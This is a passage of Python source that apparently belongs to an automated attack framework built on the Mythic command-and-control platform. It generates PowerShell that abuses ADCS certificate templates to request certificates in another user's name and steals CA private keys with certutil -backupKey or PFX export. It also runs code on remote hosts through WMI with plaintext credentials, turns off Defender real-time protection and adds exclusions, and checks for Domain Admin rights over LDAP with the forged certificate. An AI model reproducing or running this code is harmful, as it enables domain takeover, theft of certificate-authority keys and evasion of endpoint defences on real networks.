        return MythicCapabilityCommandPlan(False, missing=["adcs_ca_export_command"], reason="no ADCS CA export command")
    upload_command = _adapter_text(config, "tool_upload_command", "upload")
    upload_filename_param = _adapter_text(
        config,
        "tool_upload_filename_param",
        _adapter_text(config, "upload_file_param", "File"),
    )
    upload_path_param = _adapter_text(
        config,
        "tool_upload_path_param",
        _adapter_text(config, "upload_path_param", "Path"),
    )
    local_stage_path = _text(parameters.get("local_stage_path") or config.get("adcs_ca_local_stage_path") or f"C:\\Windows\\Temp\\{tool_name}")
    realm = _text(parameters.get("local_realm") or parameters.get("realm") or target_host)
    principal = local_account if ("\\" in local_account or "@" in local_account) else f"{realm}\\{local_account}"
    share_host = _adapter_text(config, "native_remote_exec_share_host", target_host) or target_host
    powershell = _adcs_ca_dpapi_export_powershell(
        host=host,
        share_host=share_host,
        principal=principal,
        password=password,
        proof_marker=proof_marker,
        local_stage_path=local_stage_path,
        staged_tool_path=staged_tool_path,
        output_path=output_path,
        wait_seconds=_text(parameters.get("wait_seconds") or config.get("adcs_ca_export_wait_seconds") or "12"),
    )
    capability = _text(getattr(step, "capability", ""))
    prerequisites = list(getattr(step, "prerequisites", []) or [])
    commands: list[MythicCapabilityCommand] = []
    if _input_bool(config, "adcs_ca_include_tool_upload", default=True):
        commands.append(MythicCapabilityCommand(
            command=upload_command,
            parameters={
                upload_filename_param: tool_file_uuid,
                upload_path_param: local_stage_path,
            },
            capability=capability,
            purpose=f"stage {tool_name} on the callback host for remote CA execution",
            expected_probe="",
            prerequisites=prerequisites,
            produces=["dpapi_tool_staged_on_callback"],
        ))
    staged_tool_consumes = ["dpapi_tool_staged_on_callback"] if commands else []

    normalized_command = _normalize(command)
    if normalized_command == "run":
        commands.extend(_explicit_credential_run_reset_commands(step, config))
        commands.append(MythicCapabilityCommand(
            command=command,
            parameters={
                _adapter_text(config, "run_executable_param", "executable"): "powershell.exe",
                _adapter_text(config, "run_arguments_param", "arguments"): _powershell_encoded_args(powershell),
            },
            capability=capability,
            purpose=_text(getattr(step, "purpose", "")),
            expected_probe="extract_adcs_ca_private_key_probe",
            prerequisites=prerequisites,
            consumes=staged_tool_consumes,
            produces=["adcs_ca_private_key_material"],
        ))
    elif normalized_command == "shell":
        commands.append(MythicCapabilityCommand(
            command=command,
            parameters={
                _adapter_text(config, "shell_arguments_param", "arguments"): "powershell.exe " + _powershell_encoded_args(powershell),
            },
            capability=capability,
            purpose=_text(getattr(step, "purpose", "")),
            expected_probe="extract_adcs_ca_private_key_probe",
            prerequisites=prerequisites,
            consumes=staged_tool_consumes,
            produces=["adcs_ca_private_key_material"],
        ))
    else:
        raw_script = _input_bool(config, "adcs_ca_export_raw_script", default=True)
        commands.append(_command_from_step(
            step,
            command,
            powershell if raw_script else {_adapter_text(config, "adcs_ca_export_script_param", "script"): powershell},
            produces=["adcs_ca_private_key_material"],
        ))
    return MythicCapabilityCommandPlan(True, commands=commands)


def _adcs_esc_certificate_enroll_powershell(
    *,
    domain: str,
    account: str,
    ca_name: str,
    template: str,
    subject: str,
    subject_alt_name: str,
    certificate_path: str,
    certificate_password: str,
    proof_marker: str,
    esc_type: str,
) -> str:
    slug = _normalize(f"{account}_{domain}").replace(".", "_")
    return ";".join([
        "$ErrorActionPreference='Continue'",
        "$lines=New-Object System.Collections.Generic.List[string]",
        f"$lines.Add({_ps_quote(proof_marker)})",
        "$lines.Add('CERT_ENROLL_METHOD=native-certreq')",
        f"$lines.Add(('CERT_ENROLL_DOMAIN='+{_ps_quote(domain)}))",
        f"$lines.Add(('CERT_ENROLL_ACCOUNT='+{_ps_quote(account)}))",
        f"$lines.Add(('CERT_ENROLL_CA='+{_ps_quote(ca_name)}))",
        f"$lines.Add(('CERT_ENROLL_TEMPLATE='+{_ps_quote(template)}))",
        f"$lines.Add(('CERT_ENROLL_ESC='+{_ps_quote(esc_type)}))",
        (
            "try{"
            f"$work=Join-Path $env:TEMP {_ps_quote('sage_cert_enroll_' + slug)};"
            "New-Item -ItemType Directory -Path $work -Force|Out-Null;"
            "$inf=Join-Path $work 'request.inf';"
            "$req=Join-Path $work 'request.req';"
            "$cer=Join-Path $work 'issued.cer';"
            f"$pfxPath={_ps_quote(certificate_path)};"
            f"$pfxSecret={_ps_quote(certificate_password)};"
            f"$subject={_ps_quote(subject)};"
            f"$upn={_ps_quote(subject_alt_name)};"
            f"$template={_ps_quote(template)};"
            f"$ca={_ps_quote(ca_name)};"
            "$pfxDir=[IO.Path]::GetDirectoryName($pfxPath);"
            "if($pfxDir){New-Item -ItemType Directory -Path $pfxDir -Force|Out-Null};"
            "$infLines=@("
            "'[Version]',"
            "'Signature=\"$Windows NT$\"',"
            "'[NewRequest]',"
            "('Subject = \"'+$subject+'\"'),"
            "'KeySpec = 1',"
            "'KeyLength = 2048',"
            "'Exportable = TRUE',"
            "'MachineKeySet = FALSE',"
            "'SMIME = FALSE',"
            "'PrivateKeyArchive = FALSE',"
            "'UserProtected = FALSE',"
            "'UseExistingKeySet = FALSE',"
            "'ProviderName = \"Microsoft RSA SChannel Cryptographic Provider\"',"
            "'ProviderType = 12',"
            "'RequestType = PKCS10',"
            "'KeyUsage = 0xa0',"
            "'[Extensions]',"
            "'2.5.29.17 = \"{text}\"',"
            "('_continue_ = \"upn='+$upn+'&\"'),"
            "'[RequestAttributes]',"
            "('CertificateTemplate = '+$template)"
            ");"
            "Set-Content -LiteralPath $inf -Value $infLines -Encoding ASCII;"
            "$newOut=& certreq.exe -new $inf $req 2>&1;"
            "$lines.Add('CERTREQ_NEW_OUTPUT_BEGIN');"
            "$lines.AddRange([string[]]($newOut|ForEach-Object{[string]$_}));"
            "$lines.Add('CERTREQ_NEW_OUTPUT_END');"
            "if(-not (Test-Path -LiteralPath $req)){throw 'certreq -new did not create a request'};"
            "$attrib='CertificateTemplate:'+$template+[Environment]::NewLine+'SAN:upn='+$upn;"
            "$submitOut=& certreq.exe -submit -config $ca -attrib $attrib $req $cer 2>&1;"
            "$lines.Add('CERTREQ_SUBMIT_OUTPUT_BEGIN');"
            "$lines.AddRange([string[]]($submitOut|ForEach-Object{[string]$_}));"
            "$lines.Add('CERTREQ_SUBMIT_OUTPUT_END');"
            "$submitText=($submitOut -join [Environment]::NewLine);"
            "if($submitText -match '(?i)requestid\\s*[:=]?\\s*(\\d+)'){$lines.Add(('CERT_REQUEST_ID='+$matches[1]))};"
            "if(-not (Test-Path -LiteralPath $cer)){throw 'certreq -submit did not return an issued certificate'};"
            "$acceptOut=& certreq.exe -accept $cer 2>&1;"
            "$lines.Add('CERTREQ_ACCEPT_OUTPUT_BEGIN');"
            "$lines.AddRange([string[]]($acceptOut|ForEach-Object{[string]$_}));"
            "$lines.Add('CERTREQ_ACCEPT_OUTPUT_END');"
            "$cert=Get-ChildItem -Path Cert:\\CurrentUser\\My | Where-Object { $_.HasPrivateKey -and "
            "(($_.Subject -like ('*CN='+$account+'*')) -or ($_.Subject -like ('*'+$account+'*'))) } "
            "| Sort-Object NotBefore -Descending | Select-Object -First 1;"
            "if(-not $cert){$cert=Get-ChildItem -Path Cert:\\CurrentUser\\My | Where-Object { $_.HasPrivateKey } "
            "| Sort-Object NotBefore -Descending | Select-Object -First 1};"
            "if(-not $cert){throw 'issued certificate with private key not found in CurrentUser store'};"
            "$secure=ConvertTo-SecureString $pfxSecret -AsPlainText -Force;"
            "Export-PfxCertificate -Cert $cert -FilePath $pfxPath -Password $secure -Force|Out-Null;"
            "$bytes=[IO.File]::ReadAllBytes($pfxPath);"
            "$sha=[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-','').ToLowerInvariant();"
            "$lines.Add('CERT_ENROLL_STATUS=OK');"
            "$lines.Add(('CERT_SUBJECT='+$cert.Subject));"
            "$lines.Add(('CERT_THUMBPRINT='+$cert.Thumbprint));"
            "$lines.Add(('CERT_PFX_PATH='+$pfxPath));"
            "$lines.Add(('PFX_SHA256='+$sha));"
            "$lines.Add(('PFX_BASE64='+[Convert]::ToBase64String($bytes)));"
            "}catch{"
            "$msg=$_.Exception.Message -replace \"`r|`n\",' ';"
            "$lines.Add('CERT_ENROLL_STATUS=FAILED');"
            "$lines.Add(('CERT_ENROLL_ERROR='+$msg));"
            "};"
            "$lines|Write-Output"
        ),
    ])


def _adcs_ca_dpapi_export_powershell(
    *,
    host: str,
    share_host: str,
    principal: str,
    password: str,
    proof_marker: str,
    local_stage_path: str,
    staged_tool_path: str,
    output_path: str,
    wait_seconds: str,
) -> str:
    share_root = f"\\\\{share_host}\\C$"
    staged_drive_path = _psdrive_path("SAGECA", staged_tool_path)
    output_drive_path = _psdrive_path("SAGECA", output_path)
    remote_command = " ".join([
        "cmd.exe", "/c",
        "echo", proof_marker, ">", _windows_arg(output_path),
        "&",
        _windows_arg(staged_tool_path),
        "certificates", "/machine", "/nowrap",
        ">>",
        _windows_arg(output_path),
        "2>&1",
    ])
    return ";".join([
        "$ErrorActionPreference='Stop'",
        f"$sec=ConvertTo-SecureString {_ps_quote(password)} -AsPlainText -Force",
        f"$cred=New-Object System.Management.Automation.PSCredential({_ps_quote(principal)},$sec)",
        (
            "New-PSDrive -Name SAGECA -PSProvider FileSystem "
            f"-Root {_ps_quote(share_root)} -Credential $cred | Out-Null"
        ),
        f"Copy-Item -LiteralPath {_ps_quote(local_stage_path)} -Destination {_ps_quote(staged_drive_path)} -Force",
        f"$cmd={_ps_quote(remote_command)}",
        (
            "$res=Invoke-WmiMethod -Class Win32_Process -Name Create "
            f"-ComputerName {_ps_quote(host)} -Credential $cred -ArgumentList $cmd"
        ),
        "$res | Out-String | Write-Output",
        "$remotePid=$res.ProcessId",
        f"$deadline=(Get-Date).AddSeconds({wait_seconds})",
        (
            "while($remotePid -and (Get-Date) -lt $deadline){"
            "Start-Sleep -Seconds 5;"
            f"$proc=Get-WmiObject -Class Win32_Process -ComputerName {_ps_quote(host)} -Credential $cred -Filter ('ProcessId='+$remotePid);"
            "if(-not $proc){break}"
            "}"
        ),
        f"Write-Output {_ps_quote(proof_marker)}",
        (
            f"if(Test-Path -LiteralPath {_ps_quote(output_drive_path)})"
            f"{{Get-Content -LiteralPath {_ps_quote(output_drive_path)}}}"
            "else{Write-Output 'CA_EXPORT_STATUS=OUTPUT_NOT_FOUND'}"
        ),
    ])


def _endpoint_protection_powershell(
    *,
    host: str,
    share_host: str,
    principal: str,
    password: str,
    proof_marker: str,
    output_path: str,
    wait_seconds: str,
    actions: list[str],
    exclusion_paths: list[str],
    remote: bool,
) -> str:
    inner = _endpoint_protection_inner_powershell(
        proof_marker=proof_marker,
        actions=actions,
        exclusion_paths=exclusion_paths,
        output_path=output_path if remote else "",
    )
    if not remote:
        return inner

    encoded = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
    share_root = f"\\\\{share_host}\\C$"
    drive_path = _psdrive_path("SAGEEP", output_path)
    return ";".join([
        "$ErrorActionPreference='Stop'",
        f"$sec=ConvertTo-SecureString {_ps_quote(password)} -AsPlainText -Force",
        f"$cred=New-Object System.Management.Automation.PSCredential({_ps_quote(principal)},$sec)",
        f"$cmd='powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}'",
        (
            "$res=Invoke-WmiMethod -Class Win32_Process -Name Create "
            f"-ComputerName {_ps_quote(host)} -Credential $cred -ArgumentList $cmd"
        ),
        "$res | Out-String | Write-Output",
        "$remotePid=$res.ProcessId",
        f"$deadline=(Get-Date).AddSeconds({wait_seconds})",
        (
            "while($remotePid -and (Get-Date) -lt $deadline){"
            "Start-Sleep -Seconds 2;"
            f"$proc=Get-WmiObject -Class Win32_Process -ComputerName {_ps_quote(host)} -Credential $cred -Filter ('ProcessId='+$remotePid);"
            "if(-not $proc){break}"
            "}"
        ),
        (
            "New-PSDrive -Name SAGEEP -PSProvider FileSystem "
            f"-Root {_ps_quote(share_root)} -Credential $cred | Out-Null"
        ),
        f"Write-Output {_ps_quote(proof_marker)}",
        (
            f"if(Test-Path -LiteralPath {_ps_quote(drive_path)})"
            f"{{Get-Content -LiteralPath {_ps_quote(drive_path)}}}"
            "else{Write-Output 'EP_STATUS=OUTPUT_NOT_FOUND'}"
        ),
    ])


def _certificate_schannel_ldap_powershell(
    *,
    domain: str,
    account: str,
    certificate_path: str,
    certificate_password: str,
    domain_controller: str,
    search_base: str,
    proof_marker: str,
) -> str:
    account_filter = (
        account
        .replace("\\", r"\5c")
        .replace("*", r"\2a")
        .replace("(", r"\28")
        .replace(")", r"\29")
        .replace("\x00", r"\00")
    )
    return ";".join([
        "$ErrorActionPreference='Continue'",
        "$lines=New-Object System.Collections.Generic.List[string]",
        f"$lines.Add({_ps_quote(proof_marker)})",
        "$lines.Add('CERT_AUTH_METHOD=schannel-ldap')",
        f"$lines.Add(('CERT_AUTH_DOMAIN='+{_ps_quote(domain)}))",
        f"$lines.Add(('CERT_AUTH_ACCOUNT='+{_ps_quote(account)}))",
        f"$server={_ps_quote(domain_controller)}",
        f"$base={_ps_quote(search_base)}",
        f"$certPath={_ps_quote(certificate_path)}",
        f"$certPassword={_ps_quote(certificate_password)}",
        f"$filter={_ps_quote(f'(&(objectClass=user)(sAMAccountName={account_filter}))')}",
        (
            "try{"
            "Add-Type -AssemblyName System.DirectoryServices.Protocols;"
            "Add-Type -AssemblyName System.Security;"
            "$flags=[System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable;"
            "$cert=New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certPath,$certPassword,$flags);"
            "$clientCert=$cert;"
            "$conn=$null;"
            "$searchResponse=$null;"
            "$lastErr=$null;"
            "$toText={param($value) if($value -is [byte[]]){[Text.Encoding]::UTF8.GetString($value)}else{[string]$value}};"
            "$attrs=[string[]]@('distinguishedName','memberOf','primaryGroupID','sAMAccountName');"
            "$scope=[System.DirectoryServices.Protocols.SearchScope]::Subtree;"
            "$attempts=@("
            "(New-Object psobject -Property @{Mode='ldaps';Port=636;Ssl=$true}),"
            "(New-Object psobject -Property @{Mode='starttls';Port=389;Ssl=$false})"
            ");"
            "foreach($attempt in $attempts){"
            "try{"
            "$id=New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($server,[int]$attempt.Port,$true,$false);"
            "$candidate=New-Object System.DirectoryServices.Protocols.LdapConnection($id);"
            "$candidate.AuthType=[System.DirectoryServices.Protocols.AuthType]::External;"
            "$candidate.SessionOptions.SecureSocketLayer=[bool]$attempt.Ssl;"
            "$candidate.SessionOptions.ProtocolVersion=3;"
            "$candidate.SessionOptions.ReferralChasing=[System.DirectoryServices.Protocols.ReferralChasingOptions]::None;"
            "$candidate.SessionOptions.VerifyServerCertificate={param($connection,$certificate) $true};"
            "$candidate.SessionOptions.QueryClientCertificate={param($connection,$trustedCAs) $clientCert};"
            "$null=$candidate.ClientCertificates.Add($cert);"
            "if($attempt.Mode -eq 'starttls'){$candidate.SessionOptions.StartTransportLayerSecurity($null)};"
            "$probeRequest=New-Object System.DirectoryServices.Protocols.SearchRequest($base,$filter,$scope,$attrs);"
            "$searchResponse=$candidate.SendRequest($probeRequest);"
            "$conn=$candidate;"
            "$lines.Add(('CERT_AUTH_TRANSPORT='+$attempt.Mode));"
            "$lines.Add(('CERT_AUTH_PORT='+[string]$attempt.Port));"
            "break"
            "}catch{"
            "$lastErr=$_;"
            "$msg=$_.Exception.Message -replace \"`r|`n\",' ';"
            "$lines.Add(('CERT_AUTH_ATTEMPT_'+$attempt.Mode.ToUpperInvariant()+'_STATUS=FAILED'));"
            "$lines.Add(('CERT_AUTH_ATTEMPT_'+$attempt.Mode.ToUpperInvariant()+'_ERROR='+$msg));"
            "}"
            "};"
            "if(-not $conn){"
            "$lines.Add('CERT_AUTH_LDAP_BIND=False');"
            "if($lastErr){"
            "$lines.Add(('CERT_AUTH_ERROR_TYPE='+$lastErr.Exception.GetType().FullName));"
            "$lines.Add(('CERT_AUTH_HRESULT=0x{0:x8}' -f ($lastErr.Exception.HResult -band 0xffffffff)));"
            "if($lastErr.Exception.InnerException){$inner=$lastErr.Exception.InnerException.Message -replace \"`r|`n\",' ';$lines.Add(('CERT_AUTH_INNER_ERROR='+$inner))};"
            "$msg=$lastErr.Exception.Message -replace \"`r|`n\",' ';$lines.Add(('CERT_AUTH_ERROR='+$msg))"
            "};"
            "$lines.Add('CERT_AUTH_STATUS=FAILED');"
            "$lines|Write-Output;"
            "return"
            "};"
            "$lines.Add('CERT_AUTH_LDAP_BIND=True');"
            "$whoRequest=New-Object System.DirectoryServices.Protocols.ExtendedRequest('1.3.6.1.4.1.4203.1.11.3');"
            "$whoResponse=$conn.SendRequest($whoRequest);"
            "if($whoResponse.ResponseValue){$lines.Add(('CERT_AUTH_WHOAMI='+[Text.Encoding]::UTF8.GetString($whoResponse.ResponseValue)))};"
            "$res=$searchResponse;"
            "if($res.Entries.Count -lt 1){"
            "$lines.Add('CERT_AUTH_STATUS=FAILED');"
            "$lines.Add('CERT_AUTH_ERROR=target account not found')"
            "}else{"
            "$entry=$res.Entries[0];"
            "$lines.Add(('CERT_AUTH_USER_DN='+[string]$entry.DistinguishedName));"
            "$isDa=$false;"
            "if($entry.Attributes['memberOf']){"
            "foreach($group in $entry.Attributes['memberOf']){"
            "$g=& $toText $group;"
            "$lines.Add(('CERT_AUTH_MEMBER_OF='+$g));"
            "if($g -match '(?i)^CN=Domain Admins,'){$isDa=$true}"
            "}"
            "};"
            "if($entry.Attributes['primaryGroupID'] -and $entry.Attributes['primaryGroupID'].Count -gt 0){"
            "$pg=& $toText $entry.Attributes['primaryGroupID'][0];"
            "$lines.Add(('CERT_AUTH_PRIMARY_GROUP_ID='+$pg));"
            "if($pg -eq '512'){$isDa=$true}"
            "};"
            "$lines.Add(('CERT_AUTH_DOMAIN_ADMIN='+[string]$isDa));"
            "$lines.Add('CERT_AUTH_STATUS=OK')"
            "}"
            "}catch{"
            "$lines.Add('CERT_AUTH_LDAP_BIND=False');"
            "$msg=$_.Exception.Message -replace \"`r|`n\",' ';"
            "$lines.Add(('CERT_AUTH_ERROR_TYPE='+$_.Exception.GetType().FullName));"
            "$lines.Add(('CERT_AUTH_HRESULT=0x{0:x8}' -f ($_.Exception.HResult -band 0xffffffff)));"
            "if($_.Exception.InnerException){$inner=$_.Exception.InnerException.Message -replace \"`r|`n\",' ';$lines.Add(('CERT_AUTH_INNER_ERROR='+$inner))};"
            "$lines.Add('CERT_AUTH_STATUS=FAILED');"
            "$lines.Add(('CERT_AUTH_ERROR='+$msg))"
            "};"
            "$lines|Write-Output"
        ),
    ])


def _endpoint_protection_inner_powershell(
    *,
    proof_marker: str,
    actions: list[str],
    exclusion_paths: list[str],
    output_path: str,
) -> str:
    action_array = _ps_array(actions)
    exclusion_array = _ps_array(exclusion_paths)
    finish = (
        f"$lines|Set-Content -Encoding ASCII -Path {_ps_quote(output_path)};"
        "$lines|Write-Output"
        if output_path else
        "$lines|Write-Output"
    )
    return ";".join([
        "$ErrorActionPreference='Continue'",
        "$lines=New-Object System.Collections.Generic.List[string]",
        f"$lines.Add({_ps_quote(proof_marker)})",
        "$lines.Add(('EP_HOST='+$env:COMPUTERNAME))",
        f"$actions={action_array}",
        f"$requested={exclusion_array}",
        (
            "try{$before=Get-MpComputerStatus -ErrorAction Stop;"
            "$lines.Add('EP_STATUS=OK');"
            "$lines.Add(('EP_REALTIME_BEFORE='+[string]$before.RealTimeProtectionEnabled));"
            "$lines.Add(('EP_ANTIVIRUS_ENABLED='+[string]$before.AntivirusEnabled));"
            "$lines.Add(('EP_AMSERVICE_ENABLED='+[string]$before.AMServiceEnabled));"
            "if($before.PSObject.Properties.Name -contains 'IsTamperProtected')"
            "{$lines.Add(('EP_TAMPER_PROTECTED='+[string]$before.IsTamperProtected))}"
            "}catch{$lines.Add('EP_STATUS=FAILED');$lines.Add(('EP_ERROR='+$_.Exception.Message))}"
        ),
        (
            "if($actions -contains 'disable_realtime'){"
            "try{Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop;"
            "$lines.Add('EP_SET_STATUS=OK')}"
            "catch{$lines.Add('EP_SET_STATUS=FAILED');$lines.Add(('EP_SET_ERROR='+$_.Exception.Message))}"
            "}"
        ),
        (
            "if($actions -contains 'add_exclusion'){"
            "foreach($path in $requested){"
            "try{Add-MpPreference -ExclusionPath $path -ErrorAction Stop;"
            "$lines.Add('EP_EXCLUSION_STATUS=OK')}"
            "catch{$lines.Add('EP_EXCLUSION_STATUS=FAILED');$lines.Add(('EP_EXCLUSION_ERROR='+$_.Exception.Message))}"
            "}"
            "}"
        ),
        (
            "try{$pref=Get-MpPreference -ErrorAction Stop;"
            "$present=$false;"
            "foreach($path in $requested){"
            "if($pref.ExclusionPath -contains $path){$present=$true;$lines.Add(('EP_REQUESTED_EXCLUSION='+$path))}"
            "};"
            "$lines.Add(('EP_EXCLUSION_PRESENT='+[string]$present))"
            "}catch{$lines.Add(('EP_PREF_ERROR='+$_.Exception.Message))}"
        ),
        (
            "try{$after=Get-MpComputerStatus -ErrorAction Stop;"
            "$lines.Add(('EP_REALTIME_AFTER='+[string]$after.RealTimeProtectionEnabled));"
            "$lines.Add(('EP_ANTIVIRUS_AFTER='+[string]$after.AntivirusEnabled));"
            "$lines.Add(('EP_AMSERVICE_AFTER='+[string]$after.AMServiceEnabled))"
            "}catch{$lines.Add(('EP_AFTER_ERROR='+$_.Exception.Message))}"
        ),
        finish,
    ])


def _adcs_ca_export_powershell(
    *,
    host: str,
    share_host: str,
    principal: str,
    password: str,
    use_current_context: bool,
    proof_marker: str,
    pfx_path: str,
    metadata_path: str,
    pfx_password: str,
    wait_seconds: str,
    export_method: str = "certutil-backupkey",
) -> str:
    share_root = f"\\\\{share_host}\\C$"
    pfx_drive_path = _psdrive_path("SAGECA", pfx_path)
    metadata_drive_path = _psdrive_path("SAGECA", metadata_path)
    remote_script = _adcs_ca_export_remote_script(
        export_method=export_method,
        proof_marker=proof_marker,
        pfx_path=pfx_path,
        metadata_path=metadata_path,
        pfx_password=pfx_password,
    )
    lines = [
        "$ErrorActionPreference='Stop'",
        f"$remote={_ps_quote(remote_script)}",
        "$enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($remote))",
    ]
    credential_arg = ""
    psdrive_credential_arg = ""
    if not use_current_context:
        lines.extend([
            f"$sec=ConvertTo-SecureString {_ps_quote(password)} -AsPlainText -Force",
            f"$cred=New-Object System.Management.Automation.PSCredential({_ps_quote(principal)},$sec)",
        ])
        credential_arg = " -Credential $cred"
        psdrive_credential_arg = " -Credential $cred"
    lines.extend([
        (
            "Invoke-WmiMethod -Class Win32_Process -Name Create "
            f"-ComputerName {_ps_quote(host)}{credential_arg} "
            "-ArgumentList ('powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand '+$enc) "
            "| Out-String | Write-Output"
        ),
        f"Start-Sleep -Seconds {wait_seconds}",
        (
            "New-PSDrive -Name SAGECA -PSProvider FileSystem "
            f"-Root {_ps_quote(share_root)}{psdrive_credential_arg} | Out-Null"
        ),
        f"$meta=Get-Content -LiteralPath {_ps_quote(metadata_drive_path)}",
        "$meta | Write-Output",
        f"if((($meta -join \"`n\") -match 'CA_EXPORT_STATUS=OK') -and (($meta -join \"`n\") -notmatch '(?m)^PFX_BASE64=')){{$bytes=Get-Content -LiteralPath {_ps_quote(pfx_drive_path)} -Encoding Byte;$sha=[System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-','').ToLowerInvariant();Write-Output ('PFX_SHA256='+$sha);Write-Output ('PFX_BASE64='+[Convert]::ToBase64String($bytes))}}",
    ])
    return ";".join(lines)


def _adcs_ca_export_remote_script(
    *,
    export_method: str,
    proof_marker: str,
    pfx_path: str,
    metadata_path: str,
    pfx_password: str,
) -> str:
    if _normalize(export_method) in {"certutil", "certutil-backupkey", "certutil_backupkey", "ca-backup", "ca_backup"}:
        return _adcs_ca_certutil_backup_remote_powershell(
            proof_marker=proof_marker,
            pfx_path=pfx_path,
            metadata_path=metadata_path,
            pfx_password=pfx_password,
        )
    return _adcs_ca_export_remote_powershell(
        proof_marker=proof_marker,
        pfx_path=pfx_path,
        metadata_path=metadata_path,
        pfx_password=pfx_password,
    )


def _adcs_ca_certutil_backup_remote_powershell(
    *,
    proof_marker: str,
    pfx_path: str,
    metadata_path: str,
    pfx_password: str,
) -> str:
    return ";".join([
        "$ErrorActionPreference='Stop'",
        f"$marker={_ps_quote(proof_marker)}",
        f"$pfxPath={_ps_quote(pfx_path)}",
        f"$metaPath={_ps_quote(metadata_path)}",
        f"$pfxSecret={_ps_quote(pfx_password)}",
        "$lines=@($marker,('CA_HOST='+$env:COMPUTERNAME))",
        (
            "try{"
            "$metaDir=[IO.Path]::GetDirectoryName($metaPath);"
            "if($metaDir){[IO.Directory]::CreateDirectory($metaDir)|Out-Null};"
            "$backupDir=[IO.Path]::Combine([IO.Path]::GetDirectoryName($pfxPath),"
            "([IO.Path]::GetFileNameWithoutExtension($pfxPath)+'_backup'));"
            "[IO.Directory]::CreateDirectory($backupDir)|Out-Null;"
            "$cert=Get-ChildItem -Path Cert:\\LocalMachine\\My | Where-Object { $_.HasPrivateKey -and "
            "(($_.Subject -match 'CA') -or ($_.Issuer -eq $_.Subject) -or "
            "($_.Extensions | Where-Object { $_.Oid.FriendlyName -eq 'Basic Constraints' -and $_.Format($false) -match 'CA' })) } "
            "| Sort-Object NotAfter -Descending | Select-Object -First 1;"
            "if(-not $cert){$lines+=@('CA_EXPORT_STATUS=NO_CA_CERTIFICATE');"
            "Set-Content -LiteralPath $metaPath -Value $lines -Encoding ASCII;exit 2};"
            "$certutilOut=& certutil.exe -f -p $pfxSecret -backupKey $backupDir 2>&1;"
            "$lines+=@('CERTUTIL_BACKUP_OUTPUT_BEGIN');"
            "$lines+=($certutilOut | ForEach-Object { [string]$_ });"
            "$lines+=@('CERTUTIL_BACKUP_OUTPUT_END');"
            "$pfx=Get-ChildItem -LiteralPath $backupDir -File | Where-Object { $_.Extension -match '^(?i)\\.(pfx|p12)$' } "
            "| Sort-Object Length -Descending | Select-Object -First 1;"
            "if(-not $pfx){$lines+=@('CA_EXPORT_STATUS=FAILED','CA_EXPORT_ERROR=certutil backup did not produce a PFX/P12 file');"
            "Set-Content -LiteralPath $metaPath -Value $lines -Encoding ASCII;exit 3};"
            "$bytes=[IO.File]::ReadAllBytes($pfx.FullName);"
            "$exportedCert=New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($pfx.FullName,$pfxSecret);"
            "$sha=[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-','').ToLowerInvariant();"
            "$lines+=@('CA_EXPORT_STATUS=OK',('CA_SUBJECT='+$exportedCert.Subject),('CA_ISSUER='+$exportedCert.Issuer),"
            "('CA_THUMBPRINT='+$exportedCert.Thumbprint),('CA_PFX_PATH='+$pfx.FullName),('PFX_SHA256='+$sha),"
            "('PFX_BASE64='+[Convert]::ToBase64String($bytes)));"
            "Set-Content -LiteralPath $metaPath -Value $lines -Encoding ASCII;"
            "}catch{"
            "$msg=$_.Exception.Message -replace \"`r|`n\",' ';"
            "$lines+=@('CA_EXPORT_STATUS=FAILED',('CA_EXPORT_ERROR='+$msg));"
            "Set-Content -LiteralPath $metaPath -Value $lines -Encoding ASCII;exit 1;"
            "}"
        ),
    ])


def _adcs_ca_export_remote_powershell(
    *,
    proof_marker: str,
    pfx_path: str,
    metadata_path: str,
    pfx_password: str,
) -> str:
    return ";".join([
        "$ErrorActionPreference='Stop'",
        f"$marker={_ps_quote(proof_marker)}",
        f"$pfxPath={_ps_quote(pfx_path)}",
        f"$metaPath={_ps_quote(metadata_path)}",
        f"$pfxSecret={_ps_quote(pfx_password)}",
        "$lines=@($marker,('CA_HOST='+$env:COMPUTERNAME))",
        "try{",
        "$dir=[IO.Path]::GetDirectoryName($pfxPath);if($dir){[IO.Directory]::CreateDirectory($dir)|Out-Null}",
        "$cert=Get-ChildItem -Path Cert:\\LocalMachine\\My | Where-Object { $_.HasPrivateKey -and (($_.Subject -match 'CA') -or ($_.Issuer -eq $_.Subject) -or ($_.Extensions | Where-Object { $_.Oid.FriendlyName -eq 'Basic Constraints' -and $_.Format($false) -match 'CA' })) } | Sort-Object NotAfter -Descending | Select-Object -First 1",
        "if(-not $cert){$lines+=@('CA_EXPORT_STATUS=NO_CA_CERTIFICATE');Set-Content -LiteralPath $metaPath -Value $lines -Encoding ASCII;exit 2}",
        "$pwd=ConvertTo-SecureString $pfxSecret -AsPlainText -Force",
        "Export-PfxCertificate -Cert $cert -FilePath $pfxPath -Password $pwd -Force | Out-Null",
        "$exportedCert=New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($pfxPath,$pfxSecret)",
        "$bytes=[IO.File]::ReadAllBytes($pfxPath)",
        "$sha=[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-','').ToLowerInvariant()",
        "$lines+=@('CA_EXPORT_STATUS=OK',('CA_SUBJECT='+$exportedCert.Subject),('CA_ISSUER='+$exportedCert.Issuer),('CA_THUMBPRINT='+$exportedCert.Thumbprint),('CA_PFX_PATH='+$pfxPath),('PFX_SHA256='+$sha),('PFX_BASE64='+[Convert]::ToBase64String($bytes)))",
        "Set-Content -LiteralPath $metaPath -Value $lines -Encoding ASCII",
        "}catch{",
        "$msg=$_.Exception.Message -replace \"`r|`n\",' '",
        "$lines+=@('CA_EXPORT_STATUS=FAILED',('CA_EXPORT_ERROR='+$msg))",
        "Set-Content -LiteralPath $metaPath -Value $lines -Encoding ASCII",
        "exit 1",
        "}",
    ])


def _service_access_resource(value: Any) -> str:
    text = _text(value).strip().strip('"')
    if not text or text.startswith("{{"):
        return text
